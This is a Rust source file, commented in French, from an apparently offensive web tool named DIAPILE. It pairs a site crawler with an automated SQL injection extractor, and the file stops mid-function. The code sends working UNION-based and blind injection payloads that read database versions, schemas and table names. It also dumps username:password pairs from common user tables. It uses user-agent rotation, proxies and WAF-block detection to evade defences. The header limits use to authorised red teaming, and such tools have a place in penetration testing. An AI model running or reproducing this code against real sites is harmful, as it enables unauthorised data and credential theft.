//! DIAPILE — Web Spider + SQLi Data Extractor
//!
//! Responsabilités réelles :
//! 1. Crawler BFS — découverte des pages, formulaires et paramètres, par lots
//!    concurrents bornés.
//! 2. Extraction SQLi — via `web_attack::extract_sqli_data`, qui sélectionne le
//!    meilleur vecteur (UNION, boolean blind ou time-based) une fois l'injection
//!    confirmée. Ce module expose aussi sa propre extraction boolean blind
//!    (`sqli_extract`) utilisée par l'agent autonome.
//! 3. Formulaires — les formulaires sont collectés et exposés à `web_attack`, mais ce
//!    module ne les soumet pas lui-même.
//!
//! EXTRACTION HTML :
//!   - Liens : `href`/`action`/`formaction`, attributs `data-*` porteurs d'URL,
//!     `src` de ressources dynamiques, `srcset`, `<meta http-equiv="refresh">`.
//!     Attributs quotés (simples/doubles) **ou non guillemetés**.
//!   - Formulaires : `<input>`, `<textarea>`, `<select>` et détection CSRF.
//!
//! LISTES EXTERNES :
//!   - `--spider-ext <FILE>` : extensions statiques supplémentaires exclues du
//!     crawl (txt, une par ligne, avec ou sans point initial), en complément de
//!     `STATIC_EXT`. Chargées par `load_static_ext_file` et portées par
//!     `WebScanConfig::extra_static_ext`. Applicable au crawl de `--web-spider`.
//!
//! LIMITES CONNUES :
//!   - Extraction HTML par expressions régulières : pas de parseur HTML complet.
//!   - Aucun rendu JavaScript : les applications SPA/Next.js ne sont pas explorées.
//!   - `robots.txt` et `sitemap.xml` ne sont pas récupérés.
//!   - Le crawl est concurrent **borné** (`WebScanConfig::concurrency`) ; le
//!     délai par requête vient du `Client` construit avec `WebScanConfig::timeout`.
//!   - Ce module ne détecte pas de vulnérabilité : il produit des candidats.
//!
//! ⚠️ RÉSERVÉ AUX OPÉRATIONS RED TEAM AUTORISÉES.
#![allow(dead_code)]

use crate::web_attack::WebAuth;
use futures::stream::StreamExt;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::collections::{HashMap, HashSet, VecDeque};
use tokio::time::Duration;

// ─────────────────────────────────────────────────────────────────────────────
// Types
// ─────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SpiderResult {
    pub base_url: String,
    pub pages: Vec<PageInfo>,
    pub forms: Vec<FormInfo>,
    pub endpoints: Vec<EndpointInfo>,
    pub links: Vec<String>,
    pub emails: Vec<String>,
    pub comments: Vec<String>, // HTML comments peuvent contenir des infos sensibles
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PageInfo {
    pub url: String,
    pub status: u16,
    pub title: Option<String>,
    pub params: Vec<String>,
    pub tech_hints: Vec<String>, // WordPress, Laravel, etc.
    pub sensitive: Vec<String>,  // fichiers config, backup, etc.
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FormInfo {
    pub page_url: String,
    pub action: String,
    pub method: String,
    pub inputs: Vec<InputInfo>,
    pub has_csrf: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InputInfo {
    pub name: String,
    pub input_type: String, // text, password, hidden, email
    pub value: Option<String>,
    pub injectable: bool, // probable injection point
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EndpointInfo {
    pub url: String,
    pub method: String,
    pub params: Vec<String>,
    pub source: String, // "form", "link", "js", "api"
}

// ─────────────────────────────────────────────────────────────────────────────
// Spider/Crawler
// ─────────────────────────────────────────────────────────────────────────────

/// UA navigateur pour le spider et les clients d'extraction. Évite la signature
/// « Mozilla/5.0 » nue (corrélée trivialement par un WAF comme étant un outil et
/// non un navigateur). Le spider en tire un UA par run (sticky, pour préserver
/// l'intégrité de session/cookie), l'extraction un par appel.
fn browser_ua() -> String {
    crate::evasion::pick_user_agent(
        &crate::evasion::profile_from_level("medium"),
        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    )
}

pub struct WebSpider {
    client: Client,
    max_pages: usize,
    max_depth: usize,
    /// Nombre de requêtes concurrentes maximum (borne du lot BFS).
    concurrency: usize,
    visited: HashSet<String>,
    base_host: String,
    /// Extensions statiques additionnelles (`--spider-ext`), en plus de
    /// [`STATIC_EXT`] : les liens s'y terminant ne sont pas crawlés.
    extra_static_ext: Vec<String>,
}

/// Réponse d'une page récupérée par le spider.
///
/// `body` vaut `None` quand le type de contenu n'est ni HTML ni texte : le
/// corps n'est alors jamais téléchargé (un binaire de plusieurs dizaines de
/// Mo n'a rien à faire en mémoire pour un crawl).
struct FetchedPage {
    status: u16,
    final_url: String,
    content_type: String,
    body: Option<String>,
}

/// Récupère une page : suit les redirections, borne le corps, et filtre sur
/// `Content-Type` **avant** de lire le corps.
async fn fetch_page(client: &Client, url: &str) -> Option<FetchedPage> {
    let resp = client.get(url).send().await.ok()?;
    let status = resp.status().as_u16();
    let final_url = resp.url().to_string();
    let content_type = resp
        .headers()
        .get("content-type")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .to_lowercase();

    let is_textual =
        content_type.contains("html") || content_type.contains("text") || content_type.is_empty();

    let body = if is_textual {
        Some(crate::web_attack::read_body_bounded(resp).await)
    } else {
        None
    };

    Some(FetchedPage {
        status,
        final_url,
        content_type,
        body,
    })
}

impl WebSpider {
    pub fn new(
        base_url: &str,
        max_pages: usize,
        max_depth: usize,
        concurrency: usize,
        timeout: Duration,
        auth: &WebAuth,
        proxies: &[String],
        extra_static_ext: Vec<String>,
    ) -> Self {
        let mut builder = Client::builder()
            .timeout(timeout)
            .danger_accept_invalid_certs(true)
            .user_agent(browser_ua())
            .default_headers(auth.to_headers()) // P0.4 — session opérateur
            .redirect(reqwest::redirect::Policy::limited(10))
            .cookie_store(true);

        // P1.3 — proxy « sticky » : le crawl garde une IP stable pour ne pas
        // casser les sessions liées à l'IP côté serveur. Aucun pool ⇒ direct.
        if let Some(url) = proxies.first() {
            if let Ok(p) = reqwest::Proxy::all(url) {
                builder = builder.proxy(p);
            }
        }

        let client = builder.build().unwrap_or_default();

        let base_host = extract_host(base_url);
        Self {
            client,
            max_pages,
            max_depth,
            concurrency: concurrency.max(1),
            visited: HashSet::new(),
            base_host,
            extra_static_ext,
        }
    }

    /// Crawl BFS par lots concurrents bornés par `concurrency`.
    ///
    /// La file et `visited` ne sont mutés que hors `await` : un lot est constitué
    /// de façon synchrone (déduplication, filtre d'hôte, profondeur), puis
    /// récupéré en parallèle. Aucune URL n'est donc visitée deux fois et l'ordre
    /// de découverte reste stable.
    pub async fn crawl(&mut self, start_url: &str) -> SpiderResult {
        let mut result = SpiderResult {
            base_url: start_url.to_string(),
            pages: Vec::new(),
            forms: Vec::new(),
            endpoints: Vec::new(),
            links: Vec::new(),
            emails: Vec::new(),
            comments: Vec::new(),
        };

        println!("\n  \x1b[36m[SPIDER]\x1b[0m Crawling \x1b[33m{}\x1b[0m (max {} pages, {} en parallèle)",
            start_url, self.max_pages, self.concurrency);

        // BFS queue: (url, depth)
        let mut queue: VecDeque<(String, usize)> = VecDeque::new();
        queue.push_back((start_url.to_string(), 0));

        // File bornée : sans plafond, une arborescence de calendriers/paginations
        // (`?date=…`, `?page=…`) ferait croître la file sans limite.
        let max_queue = self.max_pages.saturating_mul(20).max(100);

        while !queue.is_empty() {
            if self.visited.len() >= self.max_pages {
                break;
            }

            // 1. Constituer le lot — synchrone, donc aucune course sur `visited`.
            let mut batch: Vec<(String, usize)> = Vec::new();
            while batch.len() < self.concurrency {
                let Some((url, depth)) = queue.pop_front() else {
                    break;
                };
                if depth > self.max_depth {
                    continue;
                }
                if self.visited.len() >= self.max_pages {
                    break;
                }

                let norm_url = normalize_url(&url, start_url);
                if norm_url.is_empty() {
                    continue;
                }
                // Pour la première URL (depth=0), on accepte même si is_same_host échoue
                if depth > 0 && !is_same_host(&norm_url, &self.base_host) {
                    continue;
                }
                // `insert` renvoie `false` si l'URL était déjà visitée (dédup).
                if !self.visited.insert(norm_url.clone()) {
                    continue;
                }

                batch.push((norm_url, depth));
            }
            if batch.is_empty() {
                break;
            }

            // 2. Récupérer le lot en parallèle borné.
            let client = self.client.clone();
            let fetched: Vec<(String, usize, Option<FetchedPage>)> = futures::stream::iter(batch)
                .map(|(norm_url, depth)| {
                    let client = client.clone();
                    async move {
                        let page = fetch_page(&client, &norm_url).await;
                        (norm_url, depth, page)
                    }
                })
                .buffer_unordered(self.concurrency)
                .collect()
                .await;

            // 3. Traiter les pages — parsing synchrone, file alimentée dans l'ordre.
            for (norm_url, depth, page) in fetched {
                let Some(fp) = page else { continue };

                println!(
                    "  \x1b[90m[FETCH]\x1b[0m {:.60} → {:.60} [{}] ct={:.30}",
                    norm_url, fp.final_url, fp.status, fp.content_type
                );

                // Le corps n'est présent que pour du HTML/texte.
                let Some(body) = fp.body else { continue };

                // Skip les redirections sans corps utile.
                if body.len() < 50 && (fp.status == 301 || fp.status == 302) {
                    continue;
                }

                // Parser la page
                let page = self.parse_page(&norm_url, fp.status, &body);
                print!(
                    "  → {:.60} [{}] {} params, {} forms",
                    norm_url,
                    fp.status,
                    page.params.len(),
                    self.count_forms(&body),
                );
                if !page.sensitive.is_empty() {
                    print!(" \x1b[38;5;196m⚠️ {}\x1b[0m", page.sensitive.join(","));
                }
                println!();

                // Extraire les liens pour continuer le crawl.
                let new_links = extract_links(&body, &norm_url, &self.extra_static_ext);
                for link in &new_links {
                    if queue.len() >= max_queue {
                        break;
                    }
                    if !self.visited.contains(link) {
                        queue.push_back((link.clone(), depth + 1));
                    }
                }
                result.links.extend(new_links);

                // Extraire les formulaires
                let forms = extract_forms(&body, &norm_url);
                for form in &forms {
                    // Créer des endpoints depuis les formulaires
                    let params: Vec<String> = form
                        .inputs
                        .iter()
                        .map(|i| i.name.clone())
                        .filter(|n| !n.is_empty())
                        .collect();
                    result.endpoints.push(EndpointInfo {
                        url: form.action.clone(),
                        method: form.method.clone(),
                        params,
                        source: "form".into(),
                    });
                }
                result.forms.extend(forms);

                // Extraire emails
                let emails = extract_emails(&body);
                result.emails.extend(emails);

                // Extraire commentaires HTML
                let comments = extract_html_comments(&body);
                result.comments.extend(comments);

                result.pages.push(page);
            }
        }

        println!(
            "  \x1b[36m[SPIDER]\x1b[0m {} pages, {} formulaires, {} endpoints découverts",
            result.pages.len(),
            result.forms.len(),
            result.endpoints.len()
        );

        result
    }

    fn parse_page(&self, url: &str, status: u16, body: &str) -> PageInfo {
        let title = extract_title(body);
        let params = extract_get_params(url);
        let tech_hints = detect_tech_hints(body);
        let sensitive = detect_sensitive_paths(url);

        PageInfo {
            url: url.to_string(),
            status,
            title,
            params,
            tech_hints,
            sensitive,
        }
    }

    fn count_forms(&self, body: &str) -> usize {
        body.to_lowercase().matches("<form").count()
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// SQLi Data Extractor
// ─────────────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SqliExtraction {
    pub db_type: Option<String>,
    pub db_version: Option<String>,
    pub db_user: Option<String>,
    pub databases: Vec<String>,
    pub tables: Vec<String>,
    pub sample_data: Vec<Vec<String>>,
}

/// Extrait des données d'une injection SQLi confirmée
pub async fn sqli_extract(
    url: &str,
    param: &str,
    method: &str,       // "GET" or "POST"
    technique: &str,    // "union", "error", "blind"
    auth: &WebAuth,     // P0.4 — contexte de session opérateur
    proxies: &[String], // P1.3 — proxy sticky (intégrité de session)
) -> SqliExtraction {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(15))
        .danger_accept_invalid_certs(true)
        .user_agent(browser_ua())
        .default_headers(auth.to_headers());
    if let Some(purl) = proxies.first() {
        if let Ok(p) = reqwest::Proxy::all(purl) {
            builder = builder.proxy(p);
        }
    }
    let client = builder.build().unwrap_or_default();

    let mut extraction = SqliExtraction {
        db_type: None,
        db_version: None,
        db_user: None,
        databases: Vec::new(),
        tables: Vec::new(),
        sample_data: Vec::new(),
    };

    match technique {
        "error" | "union" => {
            // Déterminer le nombre de colonnes avec ORDER BY
            let cols = find_column_count(&client, url, param, method).await;
            println!("  \x1b[36m[SQLi]\x1b[0m {} colonnes détectées", cols);

            if cols > 0 {
                // Index de colonne à utiliser pour placer l'expression d'extraction:
                // On place dans la PREMIÈRE colonne (index 0) pour être sûr d'avoir
                // n >= 1 à chaque itération n=1..=8.
                let target_col = 0usize;

                // Extraire la version DB
                extraction.db_version =
                    extract_via_union(&client, url, param, method, "VERSION()", target_col).await;
                extraction.db_user =
                    extract_via_union(&client, url, param, method, "USER()", target_col).await;

                // Détecter le type de DB
                extraction.db_type = detect_db_type(&extraction.db_version);
                if let Some(ref ver) = extraction.db_version {
                    println!(
                        "  \x1b[36m[SQLi]\x1b[0m version {} ({})",
                        ver.chars().take(60).collect::<String>(),
                        extraction.db_type.as_deref().unwrap_or("?")
                    );
                }

                // Lister les bases de données (MySQL d'abord, puis PG)
                let mut dbs_raw: Option<String> = extract_via_union(
                    &client,
                    url,
                    param,
                    method,
                    "GROUP_CONCAT(schema_name SEPARATOR 0x2c)",
                    target_col,
                )
                .await;
                if dbs_raw.is_none() {
                    dbs_raw = extract_via_union(
                        &client,
                        url,
                        param,
                        method,
                        "STRING_AGG(datname, ',')",
                        target_col,
                    )
                    .await;
                }
                if let Some(dbs) = dbs_raw {
                    extraction.databases = dbs
                        .split(',')
                        .map(|s| s.trim().to_string())
                        .filter(|s| !s.is_empty() && s.len() < 128 && !body_suggests_blocked(s))
                        .collect();
                    if !extraction.databases.is_empty() {
                        let preview = extraction
                            .databases
                            .join(", ")
                            .chars()
                            .take(120)
                            .collect::<String>();
                        println!(
                            "  \x1b[38;5;196m[SQLi]\x1b[0m Bases de données: {}",
                            preview
                        );
                    }
                }

                // Lister les tables de la première base valide
                if let Some(first_db) = extraction
                    .databases
                    .iter()
                    .find(|d| {
                        let l = d.to_lowercase();
                        !l.contains("forbidden")
                            && !l.contains("access denied")
                            && !l.contains("http")
                    })
                    .cloned()
                {
                    let tables_query = format!(
                        "GROUP_CONCAT(table_name SEPARATOR 0x2c) FROM information_schema.tables WHERE table_schema='{}'",
                        first_db.replace('\'', "''")
                    );
                    if let Some(tables) =
                        extract_via_union(&client, url, param, method, &tables_query, target_col)
                            .await
                    {
                        extraction.tables = tables
                            .split(',')
                            .map(|s| s.trim().to_string())
                            .filter(|s| !s.is_empty() && s.len() < 128 && !body_suggests_blocked(s))
                            .collect();
                        if !extraction.tables.is_empty() {
                            let preview = extraction
                                .tables
                                .join(", ")
                                .chars()
                                .take(180)
                                .collect::<String>();
                            println!(
                                "  \x1b[38;5;196m[SQLi]\x1b[0m Tables ({}) : {}",
                                first_db, preview
                            );
                        }
                    }
                }

                // Essayer de lire des credentials depuis les tables courantes
                for table in &["users", "user", "admin", "accounts", "members", "wp_users"] {
                    if extraction.tables.iter().any(|t| t.to_lowercase() == *table) {
                        let creds_query =
                            format!("CONCAT(username,0x3a,password) FROM {} LIMIT 3", table);
                        if let Some(creds) =
                            extract_via_union(&client, url, param, method, &creds_query, target_col)
                                .await
                        {
                            if !body_suggests_blocked(&creds) {
                                println!(
                                    "  \x1b[38;5;196m[SQLi CREDS]\x1b[0m {}: {}",
                                    table,
                                    creds.chars().take(200).collect::<String>()
                                );
                                extraction.sample_data.push(vec![table.to_string(), creds]);
                                break;
                            }
                        }
                    }
                }
            }
        }
        "blind" => {
            // Extraction bit-by-bit (lent mais fonctionne toujours)
            println!("  \x1b[36m[SQLi BLIND]\x1b[0m Extraction version DB (bit-by-bit)...");
            if let Some(version) =
                blind_extract_string(&client, url, param, method, "VERSION()", 30).await
            {
                extraction.db_version = Some(version.clone());
                extraction.db_type = detect_db_type(&Some(version));
                println!(
                    "  \x1b[38;5;196m[SQLi BLIND]\x1b[0m DB version: {}",
                    extraction.db_version.as_deref().unwrap_or("?")
                );
            }
        }
        _ => {}
    }

    extraction
}

fn body_suggests_blocked(body: &str) -> bool {
    let low = body.to_lowercase();
    low.contains("forbidden")
        || low.contains("403 ")
        || low.contains("403_forbidden")
        || low.contains("access denied")
        || low.contains("you don't have permission")
        || low.contains("permission to access")
        || low.contains("blocked")
        || low.contains("cloudflare")
        || low.contains("challenge")
        || low.contains("captcha")
        || low.contains("rate limit")
        || low.contains("rate-limit")
        || low.contains("ratelimit")
        || low.contains("waf")
        || low.contains("web application firewall")
        || low.contains("not acceptable")
        || low.contains("request unsuccessful")
}

async fn inject_checked(
    client: &Client,
    url: &str,
    param: &str,
    method: &str,
    payload: &str,
) -> Option<(u16, String)> {
    let (status, body) = inject(client, url, param, method, payload).await?;
    // Blocage explicite par statut HTTP
    if matches!(status, 401 | 403 | 407 | 429 | 451 | 503 | 418) {
        return None;
    }
    // Blocage soft : statut 200/404 mais body = page d'interdiction WAF / CDN
    if body_suggests_blocked(&body) {
        return None;
    }
    Some((status, body))
}

/// Trouve le nombre de colonnes via ORDER BY
async fn find_column_count(client: &Client, url: &str, param: &str, method: &str) -> usize {
    // D'abord récupérer la baseline pour exclure les pages 403/WAF
    let baseline = inject_checked(client, url, param, method, "1").await;
    // Si baseline est un blocage (soft ou hard), on ne peut rien détecter
    let (base_status, base_body) = match baseline {
        Some(x) => x,
        None => return 0,
    };
    // Baseline 4xx — stop
    if base_status >= 400 {
        return 0;
    }

    let mut last_good_n: Option<usize> = None;

    for n in 1..=20usize {
        let payload = format!("1 ORDER BY {}--", n);
        let resp = inject_checked(client, url, param, method, &payload).await;
        let (status, body) = match resp {
            Some(r) => r,
            None => return last_good_n.unwrap_or(0), // WAF a bloqué, stop
        };
        if status >= 400 {
            let bl = body.to_lowercase();
            // ORDER BY hors limite SEULEMENT si indice SQL clair
            if bl.contains("order by")
                || bl.contains("unknown column")
                || bl.contains("column")
                || bl.contains("syntax")
                || bl.contains("mysql")
                || bl.contains("postgresql")
                || bl.contains("mssql")
                || bl.contains("ora-")
                || bl.contains("sqlstate")
            {
                return last_good_n.unwrap_or(n.saturating_sub(1));
            }
            // Sinon erreur HTTP sans rapport (404, 500…) — on continue
            last_good_n = last_good_n.or(Some(n.saturating_sub(1)));
        } else {
            last_good_n = Some(n); // ORDER BY n a marché
        }
    }
    // Fallback: tenter UNION SELECT NULL
    let best = last_good_n.unwrap_or(0);
    for n in 1..=(best.max(10)) {
        let nulls = std::iter::repeat("NULL")
            .take(n)
            .collect::<Vec<_>>()
            .join(",");
        let payload = format!("0 UNION SELECT {}--", nulls);
        if let Some((status, body)) = inject_checked(client, url, param, method, &payload).await {
            if status < 400 {
                let bl = body.to_lowercase();
                if !bl.contains("column") && !bl.contains("syntax") {
                    return n;
                }
            }
        }
    }
    best
}

/// Extraction via UNION SELECT
async fn extract_via_union(
    client: &Client,
    url: &str,
    param: &str,
    method: &str,
    expr: &str,
    col_index: usize,
) -> Option<String> {
    // Baseline pour comparaison anti-faux positif (hard + soft block check)
    let (_base_status, base_body) = inject_checked(client, url, param, method, "1").await?;
    let base_extract = extract_first_text_content(&base_body, 200);
    let base_len = base_body.len();

    // Essayer avec 1 à 8 colonnes. col_index doit être < n.
    for n in (col_index + 1)..=8usize {
        let mut parts: Vec<String> = (0..n)
            .map(|i| {
                if i == col_index {
                    expr.to_string()
                } else {
                    format!("CHAR({})", 65 + i as u8)
                }
            })
            .collect();
        let payload = format!("0 UNION SELECT {}-- -", parts.join(","));
        let (status, body) = match inject_checked(client, url, param, method, &payload).await {
            Some(r) => r,
            None => continue,
        };
        if status >= 400 {
            continue;
        } // Pages d'erreur = pas de données

        // Si le body a la même taille que la baseline ± 5%, ce n'est probablement pas
        // une vraie injection (même page servie).
        if (body.len() as i64 - base_len as i64).unsigned_abs() as f64 / (base_len.max(1) as f64)
            < 0.05
        {
            continue;
        }

        let marker = char::from(65 + col_index as u8);
        let body_lower = body.to_lowercase();
        if body.contains(marker) && !body_lower.contains("syntax") {
            let extracted = extract_first_text_content(&body, 200);
            if !extracted.is_empty()
                && extracted != marker.to_string()
                && extracted != base_extract
                && extracted.len() < 1500
                && !body_suggests_blocked(&extracted)
            {
                return Some(extracted);
            }
        }
    }
    None
}

/// Extraction blind bit-by-bit
async fn blind_extract_string(
    client: &Client,
    url: &str,
    param: &str,
    method: &str,
    expr: &str,
    max_len: usize,
) -> Option<String> {
    // Quick sanity check: WAF ne doit pas bloquer
    let (base_status, base_body) = inject(client, url, param, method, "1").await?;
    if matches!(base_status, 401 | 403 | 407 | 429) {
        return None;
    }
    let baseline_len = base_body.len();

    let mut result = String::new();

    // D'abord obtenir la longueur
    let mut length = 0usize;
    for l in 1..=max_len {
        let payload = format!("1 AND LENGTH(({}))<{}--", expr, l + 1);
        let resp_len = inject(client, url, param, method, &payload)
            .await
            .filter(|(s, _)| !matches!(s, 401 | 403 | 407 | 429))
            .map(|(_, b)| b.len())?;

        if resp_len != baseline_len {
            length = l;
            break;
        }
    }
    if length == 0 {
        length = 20;
    } // Estimation

    // Extraire chaque caractère par dichotomie
    for pos in 1..=length {
        let mut low = 32u8; // espace
        let mut high = 126u8; // ~

        loop {
            if low >= high {
                break;
            }
            let mid = (low + high) / 2;
            let payload = format!(
                "1 AND ASCII(SUBSTRING(({}) FROM {} FOR 1))>{}--",
                expr, pos, mid
            );
            let resp = inject(client, url, param, method, &payload)
                .await
                .filter(|(s, _)| !matches!(s, 401 | 403 | 407 | 429));
            let resp_len = match resp {
                Some((_, b)) => b.len(),
                None => return None,
            };

            if resp_len == baseline_len {
                // Condition vraie — le char est > mid
                low = mid + 1;
            } else {
                // Condition fausse — le char est <= mid
                high = mid;
            }
        }

        if low >= 32 && low <= 126 {
            result.push(char::from(low));
        } else {
            break;
        }
    }

    if result.is_empty() {
        None
    } else {
        Some(result)
    }
}

/// Envoie une injection et retourne (statut, body)
async fn inject(
    client: &Client,
    url: &str,
    param: &str,
    method: &str,
    payload: &str,
) -> Option<(u16, String)> {
    match method.to_uppercase().as_str() {
        "POST" => {
            let mut form = HashMap::new();
            form.insert(param, payload);
            let resp = client.post(url).form(&form).send().await.ok()?;
            let status = resp.status().as_u16();
            Some((status, crate::web_attack::read_body_bounded(resp).await))
        }
        _ => {
            let test_url = format!("{}?{}={}", url, param, urlencoding::encode(payload));
            let resp = client.get(&test_url).send().await.ok()?;
            let status = resp.status().as_u16();
            Some((status, crate::web_attack::read_body_bounded(resp).await))
        }
    }
}

fn detect_db_type(version: &Option<String>) -> Option<String> {
    let v = version.as_deref()?.to_lowercase();
    if v.contains("mysql") || v.contains("mariadb") {
        Some("MySQL/MariaDB".into())
    } else if v.contains("postgresql") || v.contains("psql") {
        Some("PostgreSQL".into())
    } else if v.contains("microsoft sql") || v.contains("mssql") {
        Some("MSSQL".into())
    } else if v.contains("oracle") {
        Some("Oracle".into())
    } else if v.contains("sqlite") {
        Some("SQLite".into())
    } else {
        Some("Unknown".into())
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// HTML Parsing helpers
// ─────────────────────────────────────────────────────────────────────────────

/// Extensions de ressources statiques : jamais crawlables (ni page ni endpoint).
const STATIC_EXT: &[&str] = &[
    ".css", ".js", ".mjs", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".woff", ".woff2",
    ".ttf", ".eot", ".mp4", ".webm", ".mp3", ".map",
];

/// Charge un fichier d'extensions statiques supplémentaires (`--spider-ext`) :
/// une extension par ligne, `#` en tête = commentaire. Chaque valeur est
/// normalisée en minuscules et préfixée d'un `.` si nécessaire, puis
/// dédoublonnée.
pub fn load_static_ext_file(path: &str) -> Result<Vec<String>, String> {
    let items = crate::bruteforce::load_wordlist(path)?;
    let mut out: Vec<String> = Vec::with_capacity(items.len());
    for it in items {
        let mut ext = it.trim().to_lowercase();
        if ext.is_empty() {
            continue;
        }
        if !ext.starts_with('.') {
            ext.insert(0, '.');
        }
        out.push(ext);
    }
    out.sort();
    out.dedup();
    Ok(out)
}

/// Retient un lien s'il est crawlable : résolu, ni statique, ni pseudo-schéma.
/// `extra_ext` complète [`STATIC_EXT`] avec les extensions fournies par
/// l'opérateur (`--spider-ext`).
fn keep_link(raw: &str, base_url: &str, out: &mut Vec<String>, extra_ext: &[String]) {
    let link = normalize_url(raw.trim(), base_url);
    if link.is_empty() {
        return;
    }
    let lower = link.to_lowercase();
    if STATIC_EXT.iter().any(|e| lower.ends_with(e)) {
        return;
    }
    if extra_ext.iter().any(|e| lower.ends_with(e.as_str())) {
        return;
    }
    if ["tel:", "data:", "blob:", "ftp:"]
        .iter()
        .any(|s| lower.starts_with(s))
    {
        return;
    }
    out.push(link);
}

// Motifs regex **littéraux** : compilation infaillible (couvert par tests).
#[allow(clippy::unwrap_used)]
pub fn extract_links(html: &str, base_url: &str, extra_ext: &[String]) -> Vec<String> {
    let mut links = Vec::new();

    // Attributs porteurs d'URL, **quotés ou non** (`href="/a"`, `href=/a`),
    // y compris les attributs `data-*` souvent utilisés par les frameworks.
    let re_url_attr = regex::Regex::new(
        r##"(?i)\b(?:href|action|formaction|data-url|data-href|data-link|data-src|data-action)\s*=\s*(?:"([^"#\s]+)"|'([^'#\s]+)'|([^"'\s>#]+))"##,
    ).unwrap();
    // `src` : restreint aux ressources dynamiques (le reste est statique).
    let re_src = regex::Regex::new(
        r##"(?i)\bsrc\s*=\s*(?:"([^"#\s]+\.(?:php|asp|aspx|jsp|py|rb|do|cgi)[^"#\s]*)"|'([^'#\s]+\.(?:php|asp|aspx|jsp|py|rb|do|cgi)[^'#\s]*)'|([^"'\s>#]+\.(?:php|asp|aspx|jsp|py|rb|do|cgi)[^"'\s>#]*))"##,
    ).unwrap();
    // `srcset` : liste « url descripteur, url descripteur ».
    let re_srcset = regex::Regex::new(r#"(?i)\bsrcset\s*=\s*(?:"([^"]*)"|'([^']*)')"#).unwrap();
    // `<meta http-equiv="refresh" content="0; url=/next">` — redirection méta.
    let re_meta = regex::Regex::new(
        r#"(?i)<meta[^>]+http-equiv\s*=\s*["']?refresh["']?[^>]*content\s*=\s*["'][^"']*?url\s*=\s*([^"'\s;>]+)"#,
    ).unwrap();

    for caps in re_url_attr.captures_iter(html) {
        if let Some(m) = caps.get(1).or_else(|| caps.get(2)).or_else(|| caps.get(3)) {
            keep_link(m.as_str(), base_url, &mut links, extra_ext);
        }
    }
    for caps in re_src.captures_iter(html) {
        if let Some(m) = caps.get(1).or_else(|| caps.get(2)).or_else(|| caps.get(3)) {
            keep_link(m.as_str(), base_url, &mut links, extra_ext);
        }
    }
    for caps in re_srcset.captures_iter(html) {
        if let Some(m) = caps.get(1).or_else(|| caps.get(2)) {
            for candidate in m.as_str().split(',') {
                // « url 2x » → on ne garde que l'URL, pas le descripteur.
                let url = candidate.split_whitespace().next().unwrap_or("");
                if !url.is_empty() {
                    keep_link(url, base_url, &mut links, extra_ext);
                }
            }
        }
    }
    for caps in re_meta.captures_iter(html) {
        if let Some(m) = caps.get(1) {
            keep_link(m.as_str(), base_url, &mut links, extra_ext);
        }
    }

    links.sort();
    links.dedup();
    links
}

/// Nom d'attribut capturé par `re_attr`, normalisé en minuscules.
fn attr_name(caps: &regex::Captures) -> String {
    caps.get(1)
        .map(|m| m.as_str().to_lowercase())
        .unwrap_or_default()
}

/// Valeur d'un attribut capturé par `re_attr` : guillemets doubles, simples ou
/// absents (`name="x"`, `name='x'`, `name=x`).
fn attr_value(caps: &regex::Captures) -> Option<String> {
    caps.get(2)
        .or_else(|| caps.get(3))
        .or_else(|| caps.get(4))
        .map(|m| m.as_str().to_string())
}

// Motifs regex **littéraux** : compilation infaillible (couvert par tests).
#[allow(clippy::unwrap_used)]
pub fn extract_forms(html: &str, page_url: &str) -> Vec<FormInfo> {
    let mut forms = Vec::new();
    let re_form = regex::Regex::new(r#"(?is)<form([^>]*)>(.*?)</form>"#).unwrap();
    let re_input = regex::Regex::new(r#"(?i)<input([^>]*)>"#).unwrap();
    let re_textarea = regex::Regex::new(r#"(?i)<textarea([^>]*)"#).unwrap();
    let re_select = regex::Regex::new(r#"(?i)<select([^>]*)"#).unwrap();
    // Attributs quotés ("x", 'x') ou nus (x) : les attributs non guillemetés
    // sont fréquents dans le HTML généré à la main.
    let re_attr =
        regex::Regex::new(r#"(?i)([a-zA-Z_][\w:-]*)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^"'\s>]+))"#)
            .unwrap();

    for form_cap in re_form.captures_iter(html) {
        let form_attrs = form_cap.get(1).map(|m| m.as_str()).unwrap_or("");
        let form_body = form_cap.get(2).map(|m| m.as_str()).unwrap_or("");

        let mut action = String::new();
        let mut method = "GET".to_string();
        let mut has_csrf = false;

        for attr in re_attr.captures_iter(form_attrs) {
            match attr_name(&attr).as_str() {
                "action" => {
                    action = normalize_url(&attr_value(&attr).unwrap_or_default(), page_url)
                }
                "method" => {
                    method = attr_value(&attr)
                        .unwrap_or_else(|| "GET".into())
                        .to_uppercase()
                }
                _ => {}
            }
        }
        if action.is_empty() {
            action = page_url.to_string();
        }

        let mut inputs = Vec::new();

        // Inputs
        for inp in re_input.captures_iter(form_body) {
            let attrs_str = inp.get(1).map(|m| m.as_str()).unwrap_or("");
            let mut name = String::new();
            let mut itype = "text".to_string();
            let mut value = None;

            for attr in re_attr.captures_iter(attrs_str) {
                match attr_name(&attr).as_str() {
                    "name" => name = attr_value(&attr).unwrap_or_default(),
                    "type" => {
                        itype = attr_value(&attr)
                            .unwrap_or_else(|| "text".into())
                            .to_lowercase()
                    }
                    "value" => value = attr_value(&attr),
                    _ => {}
                }
            }
            let name_lower = name.to_lowercase();
            if name_lower.contains("csrf")
                || name_lower.contains("token")
                || name_lower.contains("nonce")
            {
                has_csrf = true;
            }
            let injectable = !matches!(
                itype.as_str(),
                "hidden" | "submit" | "button" | "checkbox" | "radio" | "file"
            ) && !name.is_empty();
            if !name.is_empty() {
                inputs.push(InputInfo {
                    name,
                    input_type: itype,
                    value,
                    injectable,
                });
            }
        }
        // Textareas
        for inp in re_textarea.captures_iter(form_body) {
